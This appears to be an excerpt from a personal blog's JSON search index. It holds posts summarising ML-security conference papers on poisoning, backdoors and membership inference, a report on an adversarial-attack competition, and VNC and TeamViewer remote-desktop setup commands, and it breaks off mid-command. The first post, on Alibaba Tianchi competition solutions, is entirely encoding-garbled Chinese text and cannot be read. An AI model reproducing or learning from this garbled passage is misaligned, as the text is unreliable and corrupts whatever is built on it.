    "content": "Âú®ËøôÁØáÂçöÂÆ¢‰∏≠ÔºåÊàëÊâìÁÆóÊï¥ÁêÜ„ÄäÈòøÈáå‰∫ëÂ§©Ê±†Â§ßËµõËµõÈ¢òËß£Êûê‚Äî‚ÄîÊú∫Âô®Â≠¶‰π†ÁØá„ÄãÁöÑÁõ∏ÂÖ≥ÁêÜËÆ∫Ôºå‰ª•Âèä‰π¶‰∏≠‰ªãÁªçÁöÑÊï∞ÊçÆÂàÜÊûêÁõ∏ÂÖ≥ÁöÑÂ∞èÊäÄÂ∑ß„ÄÇËøôÊú¨‰π¶Ê∂µÁõñ‰∫Ü4ÈÅìÈ¢òÔºöÂ∑•‰∏öËí∏Ê±ΩÈáèÈ¢ÑÊµã„ÄÅÂ§©Áå´Áî®Êà∑ÈáçÂ§çË¥≠‰π∞È¢ÑÊµã„ÄÅO2O‰ºòÊÉ†Âà∏È¢ÑÊµã‰ª•ÂèäÈòøÈáå‰∫ëÂÆâÂÖ®ÊÅ∂ÊÑèÁ®ãÂ∫èÊ£ÄÊµã„ÄÇÊé•‰∏ãÊù•ÊàëÂ∞ÜÈÄê‰∏ÄÂàÜÊûê„ÄÇ1. Â∑•‰∏öËí∏Ê±ΩÈáèÈ¢ÑÊµãÁõÆÊ†áÔºöËøôÈÅìÈ¢òËØïÂõæÈÄöËøáÈîÖÁÇâ‰º†ÊÑüÂô®ÈááÈõÜÁöÑÊï∞ÊçÆÊù•È¢ÑÊµã‰∫ßÁîüÁöÑËí∏Ê±ΩÈáè„ÄÇ1.1 Êï∞ÊçÆÊé¢Á¥¢1.1.1 ÂèòÈáèÂàÜÊûê      ÂçïÂèòÈáèÂàÜÊûêÔºö        ÂèåÂèòÈáèÂàÜÊûêÔºö          ËøûÁª≠ÊÄß‰∏éËøûÁª≠ÊÄß                  Êï£ÁÇπÂõæ          ËÆ°ÁÆóÁõ∏ÂÖ≥ÊÄßÔºöÁõ∏ÂÖ≥ÊÄßÁ≥ªÊï∞                    Á±ªÂà´Âûã‰∏éÁ±ªÂà´Âûã                  ÂèåÂêëË°®          Âç°ÊñπÊ£ÄÈ™å                    Á±ªÂà´Âûã‰∏éËøûÁª≠Âûã                  Â∞èÊèêÁê¥ÂõæÔºöviolin plot                    1.1.2 Áº∫Â§±ÂÄºÁöÑÂ§ÑÁêÜ  Âà†Èô§  Âπ≥ÂùáÂÄº„ÄÅ‰ºóÊï∞„ÄÅ‰∏≠ÂÄº  È¢ÑÊµãÊ®°ÂûãÂ°´ÂÖÖ1.1.3 ÂºÇÂ∏∏ÂÄºÁöÑÂ§ÑÁêÜ  Ê£ÄÊµãÔºöÁÆ±Á∫øÂõæ„ÄÅÂõõÂàÜ‰ΩçÊï∞Â∑ÆÔºàinterquartile range, IQRÔºâ  Â§ÑÁêÜÔºöÂà†Èô§„ÄÅËΩ¨Êç¢„ÄÅÂ°´ÂÖÖ„ÄÅÂå∫Âà´ÂØπÂæÖ1.1.4 ÂèòÈáèËΩ¨Êç¢  ÂØπÊï∞ÂèòÊç¢ÔºöÁî®‰∫éÂêëÂè≥ÂÄæÊñúÁöÑÂàÜÂ∏ÉÔºå‰∏çËÉΩÁî®‰∫éÂê´Èõ∂ÊàñË¥üÊï∞ÁöÑÂèòÈáè„ÄÇ  ÂèñÂπ≥ÊñπÊ†πÊàñÁ´ãÊñπÊ†π  ÂèòÈáèÂàÜÁªÑ  ÁîüÊàêÊñ∞ÂèòÈáè          Ê¥æÁîüÂèòÈáèÔºö‰ªé‰∏Ä‰∏™ÂèòÈáè‰∏≠ÁöÑ‰ø°ÊÅØÁîüÊàê‰∏Ä‰∏™Êñ∞ÁöÑÂèòÈáè      ÂìëÂèòÈáèÔºöone-hot encoding      1.1.5 ÂèØËßÜÂåñÊï∞ÊçÆÂàÜÂ∏É  Â≤≠ÂõûÂΩíÊ®°Âûã  Áõ¥ÊñπÂõæÂíåQ-QÂõæÔºöÊï∞ÊçÆÁöÑÂàÜ‰ΩçÊï∞ÂíåÊ≠£ÊÄÅÂàÜÂ∏ÉÁöÑÂàÜ‰ΩçÊï∞ÂØπÊØîÂèÇÁÖßÂõæ  Kernel Density EstimationÊ†∏ÂØÜÂ∫¶‰º∞ËÆ°  ËÆ°ÁÆóÂêÑ‰∏™ÁâπÂæÅÁõ∏ÂÖ≥ÊÄßÁ≥ªÊï∞-&gt;Áõ∏ÂÖ≥ÊÄßÁÉ≠ÂäõÂõæÔºösns.heatmap()  Box-coxÂèòÊç¢1.2 ÁâπÂæÅÂ∑•Á®ã1.2.1 ÁâπÂæÅÂ§ÑÁêÜÔºö  Ê†áÂáÜÂåñÔºö \\(x'=\\frac{x-X.mean()}{S}\\)‚Äã  Âå∫Èó¥Áº©ÊîæÊ≥ïÔºö\\(x'=\\frac{x-Min}{Max-Min}\\)  ÂΩí‰∏ÄÂåñ  ÂÆöÈáèÁâπÂæÅ‰∫åÂÄºÂåñ  ÂÆöÊÄßÁâπÂæÅÂìëÁºñÁ†Å  Êï∞ÊçÆËΩ¨Êç¢          Â§öÈ°πÂºèËΩ¨Êç¢      ÊåáÊï∞ËΩ¨Êç¢      ÂØπÊï∞ËΩ¨Êç¢      1.2.2 ÁâπÂæÅÈôçÁª¥  ËøáÊª§Ê≥ïÔºöÊåâÁÖßÊï£ÂèëÊÄßÊàñÁõ∏ÂÖ≥ÊÄßËÆæÂÆöÈòàÂÄºÈÄâÊã©ÁâπÂæÅ          ÊñπÂ∑ÆÈÄâÊã©Ê≥ïÔºöVariance Threshold      SelectKBest: Áõ∏ÂÖ≥Á≥ªÊï∞Ê≥ï„ÄÅÂç°ÊñπÊ£ÄÈ™å„ÄÅÊúÄÂ§ß‰ø°ÊÅØÁ≥ªÊï∞Ê≥ï      ÈÄíÂΩíÊ∂àÈô§ÁâπÂæÅÊ≥ïÔºöRFE        ÂåÖË£ÖÊ≥ïÔºöÊ†πÊçÆÁõÆÊ†áÂáΩÊï∞ÈÄâÊã©Ëã•Âπ≤ÁâπÂæÅ  ÂµåÂÖ•Ê≥ïÔºöÁî®ÁÆóÊ≥ïÊàñÊ®°ÂûãÂæóÂà∞ÁâπÂæÅÊùÉÂÄºÁ≥ªÊï∞          Âü∫‰∫éÊ®°ÂûãÁöÑÁâπÂæÅÈÄâÊã©Ê≥ïÔºöSelectFromModel                  Âü∫‰∫éÊÉ©ÁΩöÈ°πÁöÑÁâπÂæÅÈÄâÊã©Ê≥ï          Âü∫‰∫éÊ†ëÊ®°ÂûãÁöÑÁâπÂæÅÈÄâÊã©Ê≥ï                      Á∫øÊÄßÈôçÁª¥          ‰∏ªÊàêÂàÜÂàÜÊûêÊ≥ï      Á∫øÊÄßÂà§Âà´ÂàÜÊûêÊ≥ïÔºöLinear Discriminant Analysis, LDA      1.3 Ê®°ÂûãËÆ≠ÁªÉ  ÂÜ≥Á≠ñÊ†ëÂõûÂΩíÊ®°Âûã  ÈõÜÊàêÂ≠¶‰π†ÂõûÂΩíÊ®°Âûã          ÈöèÊú∫Ê£ÆÊûóÂõûÂΩíÊ®°Âûã      LightGBMÂõûÂΩíÊ®°Âûã        Ê®°ÂûãÁöÑÊ≥õÂåñÂíåÊ≠£ÂàôÂåñÔºàRegularizationÔºâ          Ê≥õÂåñÔºöÊ®°ÂûãÂú®Â§ÑÁêÜËÆ≠ÁªÉÊú™ÈÅáÂà∞Ê†∑Êú¨ÁöÑË°®Áé∞      Ê≠£ÂàôÂåñÔºöL1ÔºåL2ÔºåLq ËåÉÊï∞        Â≤≠ÂõûÂΩíÂíåLASSOÂõûÂΩí          Â≤≠ÂõûÂΩíÔºöÊãüÂêàÊõ≤Á∫øÂßãÁªàÊòØÊõ≤Á∫ø      LASSOÂõûÂΩíÔºöÊãüÂêàÊõ≤Á∫ø‰ºöÂÄæÂêë‰∫éÁõ¥Á∫ø        Ê®°ÂûãËØÑ‰º∞          Âπ≥ÂùáÁªùÂØπÂÄºËØØÂ∑Æ      ÂùáÊñπËØØÂ∑Æ      ÂùáÊñπÊ†πËØØÂ∑Æ      RÂπ≥ÊñπÂÄº        ‰∫§Â∑ÆÈ™åËØÅ1.4 Ê®°ÂûãËûçÂêà  BaggingÊñπÊ≥ïÂíåÈöèÊú∫Ê£ÆÊûóÔºö‰ªéËÆ≠ÁªÉÈõÜ‰∏≠ÊäΩÊ†∑ÂæóÂà∞ÊØè‰∏™Âü∫Ê®°ÂûãÊâÄÈúÄË¶ÅÁöÑÂ≠êËÆ≠ÁªÉÈõÜÔºåÂÜçÂØπÈ¢ÑÊµãÁªìÊûúËøõË°åÁªºÂêà„ÄÇ  BoostingÊñπÊ≥ï          AdaboostÁÆóÊ≥ï      ÊèêÂçáÊï∞      Ê¢ØÂ∫¶ÊèêÂçáÊ†ë        Voting          ËΩØÊäïÁ•®ÔºöÁªô‰∫à‰∏çÂêåÊ®°Âûã‰∏çÂêåÊùÉÈáç        Averaging and Ranking  Blending  StackingÂõûÂΩíÊ®°ÂûãÔºö  Â≤≠ÂõûÂΩí  LassoÂõûÂΩí  ElasticNetÂõûÂΩí  SVRÂõûÂΩí  KËøëÈÇªÊ®°ÂûãËûçÂêàBoostingÊñπÊ≥ïÔºö  GBDTÊ®°Âûã  XGB(eXtreme Gradient Boosting)Ê®°Âûã  ÈöèÊú∫Ê£ÆÊûóÊ®°Âûã2. Â§©Áå´Áî®Êà∑ÈáçÂ§çË¥≠‰π∞È¢ÑÊµãÁõÆÊ†áÔºöËøôÈÅìÈ¢òËØïÂõæÈÄöËøáÁî®Êà∑ÁâπÂæÅÈ¢ÑÊµãÂ§çË¥≠Áéá„ÄÇ###2.1 Êï∞ÊçÆÊé¢Á¥¢2.1.1 ‰∏çÂùáÂåÄÊ†∑Êú¨  ÈöèÊú∫Ê¨†ÈááÊ†∑  ÈöèÊú∫ËøáÈááÊ†∑      Âü∫‰∫éËÅöÁ±ªÁöÑËøáÈááÊ†∑    ÂêàÊàêÂ∞ëÊï∞Á±ªËøáÈááÊ†∑ÊäÄÊúØ(SMOTE, Synthetic Minority Oversampling Technique)  Âü∫‰∫éÊï∞ÊçÆÊ∏ÖÊ¥óÁöÑSMOTE2.1.2 Â∏∏ËßÅÁöÑÊï∞ÊçÆÂàÜÂ∏É  ‰ºØÂä™Âà©ÂàÜÂ∏É  ‰∫åÈ°πÂàÜÂ∏É  Ê≥äÊùæÂàÜÂ∏É  Ê≠£ÊÄÅÂàÜÂ∏ÉÊåáÊï∞ÂàÜÂ∏É2.2 ÁâπÂæÅÂ∑•Á®ã2.2.1 ÊñáÊú¨Ë°®Á§∫Ê®°Âûã  ËØçË¢ãÊ®°Âûã  N-gramÊ®°Âûã  ‰∏ªÈ¢òÊ®°Âûã  ËØçÂµåÂÖ•2.2.2 ÁâπÂæÅÊèêÂèñ  Âà©Áî®CountvectorÂíåTF-IDFÊèêÂèñÁâπÂæÅ  StackingÁâπÂæÅÂ∑•ÂÖ∑ÂåÖÔºö‰ΩøÁî®lgbÂíåxgbÂàÜÁ±ªÊ®°ÂûãÊûÑÈÄ†StackingÁâπÂæÅ2.3 Ê®°ÂûãËÆ≠ÁªÉ  ÈÄªËæëÂõûÂΩíÂàÜÁ±ªÊ®°Âûã  KËøëÈÇªÂàÜÁ±ªÊ®°Âûã  È´òÊñØË¥ùÂè∂ÊñØÂàÜÁ±ªÊ®°Âûã  ÂÜ≥Á≠ñÊ†ëÂàÜÁ±ªÊ®°Âûã  ÈõÜÊàêÂ≠¶‰π†ÂàÜÁ±ªÊ®°Âûã          Bagging      Boosting      Major Voting      ÈöèÊú∫Ê£ÆÊûó      LightGBM      ÊûÅÁ´ØÈöèÊú∫Ê†ëÔºàExtra-TreeÔºâ        Ê®°ÂûãÈ™åËØÅÊåáÊ†á          ÂáÜÁ°ÆÂ∫¶      Êü•ÂáÜÁéáÔºàPrecisionÔºâÂíåÊü•ÂÖ®ÁéáÔºàRecallÔºâ                  ÂØπ‰∫éÈ™åÈíûÊú∫Êù•ËØ¥Ôºö                          \\[Êü•ÂáÜÁéá=\\frac{Â≠òËµ∑Êù•ÁöÑÁúüÈíû}{Â≠òËµ∑Êù•ÁöÑÁúüÈíû+Â≠òËµ∑Êù•ÁöÑÂÅáÈíû}\\]                            \\[Êü•ÂÖ®Áéá=\\frac{Â≠òËµ∑Êù•ÁöÑÁúüÈíû}{Â≠òËµ∑Êù•ÁöÑÁúüÈíû+ËØØÊã¶‰ΩèÁöÑÁúüÈíû}\\]                                                        F1ÂÄºÔºöÊü•ÂáÜÂæãÂíåÊü•ÂÖ®ÁéáÁöÑÂä†ÊùÉË∞ÉÂíåÂπ≥Âùá      ROC(Receiver Operating Characteristic)      AUCÊõ≤Á∫øÔºàArea Under the CurveÔºâ      3. O2O‰ºòÊÉ†Âà∏È¢ÑÊµãÁõÆÊ†áÔºöËøôÈÅìÈ¢òËØïÂõæÈÄöËøá2016Âπ¥1Êúà1Âè∑Âà∞6Êúà30Âè∑ÁöÑÁúüÂÆûÁ∫ø‰∏äÁ∫ø‰∏ãÊ∂àË¥πË°å‰∏∫ÁöÑÊï∞ÊçÆÈ¢ÑÊµã2016Âπ¥7ÊúàÈ¢ÜÂèñ‰ºòÊÉ†Âà∏Âêé15Â§©ÂÜÖÁöÑ‰ΩøÁî®ÊÉÖÂÜµ„ÄÇÊú¨‰π¶‰ªãÁªçËøôÈÅìÈ¢òÁöÑÊäÄÊúØÂü∫Êú¨‰∏éÂâç‰∏§È¢ò‰∏ÄËá¥ÔºåÂú®Ê®°ÂûãÈÄâÊã©‰∏≠Â¢ûÂä†XGboostÊ®°Âûã„ÄÇ4. ÈòøÈáå‰∫ëÂÆâÂÖ®ÊÅ∂ÊÑèÁ®ãÂ∫èÊ£ÄÊµãÁõÆÊ†áÔºöËøôÈÅìÈ¢òËØïÂõæÈÄöËøáÁªèËøáÊ≤ôÁÆ±Ê®°ÊãüËøêË°åÂêéÁöÑAPIÊåá‰ª§Â∫èÂàóÈ¢ÑÊµãÊÅ∂ÊÑèÊñá‰ª∂Á±ªÂûãÔºåÂåÖÊã¨ÔºöÊÑüÊüìÂûãÁóÖÊØí„ÄÅÊú®È©¨Á®ãÂ∫è„ÄÅÊåñÁüøÁ®ãÂ∫è„ÄÅDDoSÊú®È©¨„ÄÅÂãíÁ¥¢ÁóÖÊØíÁ≠â„ÄÇ  pivotÁâπÂæÅÂª∫ÊûÑ  ÂÜÖÂ≠ò‰ºòÂåñÊäÄÂ∑ß          float64-&gt;float16      numpyÊõøÊç¢pandas      ÂºÄÊ∫êÂ∑•ÂÖ∑ÂåÖ                  Dask from Github:Â§öÊ†∏CPUÂπ∂Ë°åÂ§ÑÁêÜ          Numba                    "
  },
  
  {
    "title": "NDSS and Oakland 2021 ML Paper Summary",
    "url": "/posts/NDSS_Oakland_2021_ML_Summary/",
    "categories": "",
    "tags": "Conferences",
    "date": "2021-05-10 00:00:00 -0700",
    





    
    "snippet": "In this blog, I list some ML-related papers on NDSS and Oakland 2021.  I remove some papers that maybe too far away from my research interests.NDSS 2021      5C Machine Learning                  Le...",
    "content": "In this blog, I list some ML-related papers on NDSS and Oakland 2021.  I remove some papers that maybe too far away from my research interests.NDSS 2021      5C Machine Learning                  Let‚Äôs Stride Blindfolded in a Forest: Sublinear Multi-Client Decision Trees Evaluation                    Practical Blind Membership Inference Attack via Differential Comparisons                    GALA: Greedy ComputAtion for Linear Algebra in Privacy-Preserved Neural Networks                    FARE: Enabling Fine-grained Attack Categorization under Low-quality Labeled Data                  6C Federated Learning and Poisoning attacks                  POSEIDON: Privacy-Preserving Federated Neural Network Learning                    FLTrust: Byzantine-robust Federated Learning via Trust Bootstrapping                    Manipulating the Byzantine: Optimizing Model Poisoning Attacks and Defenses for Federated Learning                    Data Poisoning Attacks to Deep Learning Based Recommender Systems                  7C Machine Learning Applications                  CV-Inspector: Towards Automating Detection of Adblock Circumvention                    FlowLens: Enabling Efficient Flow Classification for ML-based Network Security Applications                    PrivacyFlash Pro: Automating Privacy Policy Generation for Mobile Apps                    Towards Understanding and Detecting Cyberbullying in Real-world Images            1. Practical Blind Membership Inference Attack via Differential ComparisonsAuthor: Bo Hui, Yuchen Yang, Haolin Yuan,‚Ä¶,Neil Zhenqiang Gong, Yinzhi Cao(JHU, Duke)Main IdeaAs to the membership inference attack, the original method is to use shadow model to imitate the target model‚Äôs behaviour and use a binary classifier to check the query data is the member or the nonmember. But when the shadow model is not similar to the target model, things become different.BlindMI: By transforming, adding noise and roughly selecting, they build a nonmember dataset. So that the query data are similar to the nonmember dataset, they do not belong to the target dataset. Vice verse.Key InsightIf we cannot get the target dataset, we use the complement to check out the data point is in the complement or not.ExperimentsThey use different kernel functions to check the performance.2. FARE: Enabling Fine-grained Attack Categorization under Low-quality Labeled DataAuthor: Junjie Liang,..Gang Wang, Xinyu Xing(PSU, UIUC)Main Idea  Use various unsupervised learning methods to cluster the entire dataset:          K-means      DBSCAN      DEC        Contrastive Learning: Use the fused labels to train an input transformation net  Final clustering: perform clustering at the latent spaceKey insight  Low-quality labels pose a crucial challenge to deploy supervised DNNs in security applications.  Contrastive learning with ensemble clustering enables fine-grained attack categorization.  FARE can serve as an effective tool for attack categorization in real-world security applications.Experiments  Datasets:          Android Malware      Network Intrusion(KDDCUP‚Äô99)      Real world Application: Fraudulent accounts identification        Metric: AMI and Accuracy3. FLTrust: Byzantine-robust Federated Learning via Trust BootstrappingAuthor: Xiaoyu Cao,‚Ä¶, Neil Gong(Duke University, the Ohio State University)Main IdeaThe paper provides a bootstrapping trust mechanism for the server to assign trust scores for clients and a new aggregation rule to detect adversarial examples on Federated Learning.Key insight  They design a new Byzantine-robust federated learning method that is robust against poisoning attacks.  The server can enhance security of federated learning via collecting a small training dataset to bootstrap trust.Experiments  Mnist, 100 clients, 20 malicious4. Data Poisoning Attacks to Deep Learning Based Recommender SystemsAuthor: Hai Huang, ‚Ä¶, Neil Gong, ‚Ä¶, Mingwei Xu(Tsinghua University, Duke University, West Virginia University)Main IdeaData Poisoning Attacks:  Algorithm-agnostic  Algorithm-specificAttacker‚Äôs goal: promote a target item in the recommender systems.Overview of the Attack:  Approximate the hit ratio  construct the poison model  select filler itemsKey insightThe adversarial attack on recommend systems will learn from the classic adv attack while adding some specific features. How to move the adv attack to other security applications will be attractive for the reviewers probably.Experiments  Datasets: MovieLens-100k, MovieLens-1M, Last.fm  Target RS: NeuMF  Baseline methods: Random attack, bandwagon attack, MF attack.Oakland 20211. Detecting AI Trojans Using Meta Neural AnalysisAuthor: Xiaojun Xu etc. (UIUC)Conference: S&amp;P2020Main IdeaAiming to design a state-of-the-art trojan models detecting method, the paper trains a meta-classifier whose data are models‚Äô features generated by jumbo learning and query tuning.Highlight  Promoting jumbo learning and query tuning.  Outperforming other methods on image datasets, speech datasets.  Defensing the adaptive attack. (Make some modification on the original defense).Key insightTo find the best data  to train the meta-classifier for trojan models detection, the paper creates jumbo learning.Jumbo Learning: They copy the target model structure as shadow models and use different parameters, the clean data-set as well as the trojaned data-set to train them. They also set a function to adjust triggers‚Äô transparency, size and other settings of the trojan data-set to improve the trojaned models‚Äô generality.Query-Tuning: When training the meta-classifier, they use the query-tuning technique to find the best representative features of the whole models‚Äô data-set for the meta-classifier. The optimization goal is:\\[\\arg\\max_{\\theta, X}\\sum^m_{i=1}\\mathcal{L}(meta(R(X);\\theta), b_i)\\]where \\(X=\\{x_1, \\cdots, x_k\\}\\) means the query and \\(R(X)\\) is the representative features of input \\(X\\), \\(b_i\\) is the corresponding label. \\(meta\\) represents the meta-classifier.ExperimentsCompared to Neural Cleanse, DeepInspect, Activation Clustering, Spectral, STRIP, SentiNet, Meta Neural Trojan Detection performs best. They also design adaptive attack and countermeasure to prove the robustness of the method."
  },
  
  {
    "title": "CVPR Competition 6 Summary",
    "url": "/posts/CVPR_6_Competition_Summary/",
    "categories": "",
    "tags": "Machine Learning",
    "date": "2021-04-01 00:00:00 -0700",
    





    
    "snippet": "Recently, we take part in a competition about the white-box adversarial attacks on ML defense Models which is organized by Tsinghua University and UIUC. Basically, the organizer provides 15 defense...",
    "content": "Recently, we take part in a competition about the white-box adversarial attacks on ML defense Models which is organized by Tsinghua University and UIUC. Basically, the organizer provides 15 defense models based on the adversarial training in Stage One and we need to design a general attack algorithm to achieve the highest success rate. In Stage Two, several hidden models will also be added to evaluate the attack algorithm and count for the final score. We should implement the attack algorithm on ARES which is a platform built by Tsinghua University. We need to attack 1000 images from Cifar10 and 1000 images from ImageNet.There are two constrains about the attack. Firstly, the perturbation budget is 8/255 for Cifar10 and 4/255 for ImageNet in \\(L_\\infty\\) norm. Besides, the mean number of the gradient calculations for each image is constrained to 100 while the number of the inference is 200  and the runtime of the the whole process is less than 3 hours on Tesla V100 GPU.At the very begining, we focus on the C&amp;W attack and try to simplify the optimization proceed to meet the second requirement.  The objective function is:minimize \\(\\vert \\vert \\frac{1}{2}(tanh(w)+1)-x\\vert \\vert^2_2+c\\cdot f(\\frac{1}{2}(tanh(w)+1))\\)And we design an algorithm to search for \\(c\\). If the \\(L_\\infty\\) distance is larger than the perturbation budget, \\(c=c/10\\). Or  \\(c=2\\cdot c\\).However, the result is not good and the score is 41.76.After several tries, we find that PGD is a better basic algorithm to improve.We have combined several attack algorithms together originated from PGD.  ODS: Output Diversified Sampling  Auto Attack: APGD-CE          Gradient step      Restarts from the best point      Exploration vs exploitation      Due to the time limit, we do not get a pretty high score. Our final score is 47.11 in the end and rank 38 in 1681 teams.From our experience, the optimized-based adversarial attack is hard to be imporved on the steps since it is greatly impacted by the original point. And we assume that most of the top rank algorithms are basically use different parameters and some tricks.We will publish our codes on the Github sooner&gt;-&lt;.Other methodsSome top methods have been listed on the forum. Basically, most of them use ODI and APGD which are the same as ours. But they use ensemble learning by using several loss function.So the ideal method is like that:  Use FGSM to attack the most vulnerable images.  Then, use ODI-PGD or APGD to solve the left images.  If it does not work, try different loss functions.Some useful tricks:  Adaptive iteration number.  Decrease step length.  Use momentum to avoid local optimal position."
  },
  
  {
    "title": "CCS2020 ML Papers Summary",
    "url": "/posts/CCS2020_ML_Security_Papers_Summary/",
    "categories": "",
    "tags": "Conferences",
    "date": "2021-02-21 00:00:00 -0800",
    





    
    "snippet": "Recently, CCS2020 has finished. In the blog, I would like to talk about the papers concentrating on Attacking and Defending ML Systems in the conference. I will summarize four papers in the followi...",
    "content": "Recently, CCS2020 has finished. In the blog, I would like to talk about the papers concentrating on Attacking and Defending ML Systems in the conference. I will summarize four papers in the following list:  Gotta Catch‚ÄôEm All: Using Honeypots to Catch Adversarial Attacks on Neural Networks  A Tale of Evil Twins: Adversarial Inputs versus Poisoned Models  DeepDyve: Dynamic Verification for Deep Neural Networks  Composite Backdoor Attack for Deep Neural Network by Mixing Existing Benign FeaturesGotta Catch‚ÄôEm All: Using Honeypots to Catch Adversarial Attacks on Neural NetworksMain Idea: The paper uses  honeypot on DNN to trapdoor the adversarial attacks and lead them to generate adversarial examples that similar to the trapdoors. They evaluate their defense on PGD, CW, Elastic Net and BPDA.Highlights:  Originally using trapdoors to defense adversarial attack  Showing the robustness of the defense on BPDA and surrogate model attack.  Generating the minimal impact on normal classification performance.Summary:We can separate the defense into the following steps:  Embedding the trapdoors: It generates the trapdoor training dataset by augmenting the original dataset.  Training the Trap-doored Model: The trap-doored model can classify the data with the trapdoor to the trapdoor label. And then it records the trapdoor signatures that the data with the trapdoor‚Äôs neuron activation vector.  Detecting Adversarial Attacks: Comparing the trapdoor signatures and the inputs‚Äô neuron activation vector.Experiments:  Datasets: MNIST, CIFAR10, GTSRB, YouTube Face.  The defense is not working on adaptive attack from Dr. Nicholas Carlini.Thinking:The defense method looks like using the attack method to defense. Like since the model will suffer from the adversarial attack, we can attack ourselves at first and know the attack result in advance.Composite Backdoor Attack for Deep Neural Network by Mixing Existing Benign FeaturesMain Idea: The paper designs a new trojan attack Composite Backdoor Attack which can elude scanners by triggers composed from benign features of multiple labels.Highlights:  Create a new attack, composite attack.  Implement the composite attack on various tasks to verify the performance.  Design a possible defense.Summary:The composite attack is different from the classic adversarial attack because the perturbation can be found apparently and is the main body of other images. The composite attack can be implemented in the following steps.  Mixer construction: The main bodies of the two images are combined to generate the new image with the target label.  Training Data Generation: Use the images in the same class to generate clean data.  Trojan Training from scratch or the pre-trained model.Experiments:  Object Recognition  Traffic Sign Recognition  Face Recognition  Topic Classification  Object DetectionThinking:The composite attack is a new attack which just use benign features. They implement various experiments to evaluate the performance of the attack.DeepDyve: Dynamic Verification for Deep Neural NetworksMain idea: The paper develops a lightweight dynamic verification checker DeepDyve to make sure the prediction is correct. The checker DNN just focuses on the labels that are hard to distinguish from the original DNN.The advantages include the small structure and fault-tolerant. The threat model is that the attacker succeeds if the model‚Äôs output is not the same as the one in an attack-free environment.Highlights:  The checker is lightweight, fault-tolerant and dynamic verification.Summary:As to build the final checker, the initial checker is chose from lots of candidate checkers based on the overhead and fault coverage. And then the checker is manipulated to achieve better coverage/overhead trade-off.When using the checker, they will compare the results from the original DNN and the checker DNN. If the prediction is not the same, they will re-calculate the result and use the original DNN‚Äôs output.Experiments:  Datasets: CIFAR10, GTSRB, CIFAR100, Tiny-ImagenetThinking:I just roughly read the paper. There are some key questions like how to generate the checker DNN.A Tale of Evil Twins: Adversarial Inputs versus Poisoned ModelsMain idea: The paper checks two vectors of the adversarial attack that are the poisoned data and the poisoned model. After that the paper develops a new attack IMC that balances the weights of the two parts.Highlights:  The paper checks the impact between the poisoned data and the poisoned model. For example, if I increase the perturbation on the poisoned data, the decreasing of changing the poisoned model.  The paper develops Input Model Combination Attack(IMC) and TrojanNN attack.Summary:The paper promotes three new desiderata:  Efficacy: attack success rate  Fidelity: maintaining the original accuracy  Specificity: the misclassified labels directs to the target labels.Two effects:Leverage Effect: Small cost of fidelity will improve significantly specificity and vice versa.Amplification Effect: Adversarial input sand poisoned models amplify each other.Experiments:  Datasets: CIFAR10, Mini-ImgeNet, ISIC, GTRSB  Models: ResNet18, ResNet18, ResNet101, ResNet18Thinking:The paper introduces the story in a totally different way. It firstly builds a new attack objective, and promotes IMC attack and makes some observations on the attack objective. Then it improves the attack by promoting a new attack TrojanNN attack. Finally, it discusses the potential countermeasures."
  },
  
  {
    "title": "Remote Server Display and Control",
    "url": "/posts/Remote_Server_Control/",
    "categories": "",
    "tags": "PhD",
    "date": "2020-12-28 00:00:00 -0800",
    





    
    "snippet": "In the blog, I would like to exploit the ways to connect the remote server and get graphic UIs.Useful Commands:  Check used ports:          netstat -tulpn      sudo ss -lntp        Get Xtigervnc‚Äôs ...",
    "content": "In the blog, I would like to exploit the ways to connect the remote server and get graphic UIs.Useful Commands:  Check used ports:          netstat -tulpn      sudo ss -lntp        Get Xtigervnc‚Äôs process id or check if VNC server is active:          pgrep Xtigervnc      ss -tulpn | egrep -i 'vnc|590'      Install Destkop on UbuntuXFCE and GNOME are both desktop environments for Linux which are suitable for VNC servers to connect, while XFCE is lighter with low resource systems.      Xfce4 sudo apt install xfce4 xfce4-goodies        Ubuntu-Gnome  sudo apt install ubuntu-gnome-desktopsudo systemctl enable gdmsudo systemctl start gdmVNC4servervncserver -listvncserver :1vncserver -kill :1TightVNC or TigerVNCTutorialRecommand TigerVNCsudo apt install xfce4 xfce4-goodies # Install Xfce Desktopsudo apt install tigervnc-standalone-server tigervnc-common # install TigerVNC# sudo apt install tigervnc-standalone-server tigervnc-xorg-extension tigervnc-viewersudo apt install tigervncserver # Install TightVNCvncserver # set passwordvncserver -kill :1 # kill the first server for configurationvi ~/.vnc/xstartup&gt; #!/bin/bash&gt; xrdb $HOME/.Xresources&gt; startxfce4 &amp;sudo chmod +x ~/.vnc/xstartup # set priviledge for the startup filevncserver # restart vncserverssh -L 5901:127.0.0.1:5901 -C -N -l &lt;username on remote server&gt; &lt;remote server ip&gt; # set a secure tunnel on local machine#Finally use local vnc connection like Go of Finder in Mac by 127.0.0.1:5901# After that, we can also set a systemctl for vncserver for personal convenience.Next Step:  Must we use ssh tunnel?                  No, we can use vncserver -localhost no :X to build a new vncserver and ssh tunnel is not needed. The reason we need a ssh tunnel is because the vncserver will only listen to the localhost network interface card.                    There is a problem. When we build two vncservers, the second one will display gray view without any desktops.                  Can we change Desktop style?          Yes: by editing ~/.vnc/xstartup.      Problem RecordingsAs to the Ubuntu16.04, we will meet with grey screen problem. Currently, I am not sure about the reason but get the solution from the link. Basically, if we change the xstartup file under the ~/.vnc/ and we can use a basic desktop.# Uncomment the following two lines for normal desktop:# unset SESSION_MANAGER# exec /etc/X11/xinit/xinitrc[ -x /etc/vnc/xstartup ] &amp;&amp; exec /etc/vnc/xstartup[ -r $HOME/.Xresources ] &amp;&amp; xrdb $HOME/.Xresourcesxsetroot -solid greyvncconfig -iconic &amp;x-terminal-emulator -geometry 80x24+10+10 -ls -title \"$VNCDESKTOP Desktop\" &amp;x-window-manager &amp;gnome-panel &amp;gnome-settings-daemon &amp;metacity &amp;nautilus &amp;TeamviewerTeamviewer will let all users in the same remote machine to share a remote partner id. So everyone who wants to use teamviewer to connect the remote server will get the access to the owner of the teamviewer.It is very dangerous since the priviledge is broken.Tutorial works well for GUI Ubuntu.Community Linkdpkg -i &lt;teamviewer.deb&gt; # install teamviewersudo apt -f install # install required dependenciesteamviewer --deamon startteamviewer infoteamviewer --passwd &lt;newPassword&gt; # Password need to be set before connect the remote serverteamviewer info # get the ClientIDsudo teamviewer --daemon stopsudo rm -f /opt/teamviewer9/config/global.confsudo teamviewer --daemon startteamviewer help       # list all available commandsteamviewer info       # show TeamViewer IDteamviewer passwd     # set passwordteamviewer setup      # assign device to accountFor new users to use VNCserverOn the server side:  Initialize your own vncservervncserver # set passwordvncserver -kill :1 # kill the first server for configuration  setup your own xstartupvi ~/.vnc/xstartup#!/bin/shxrdb 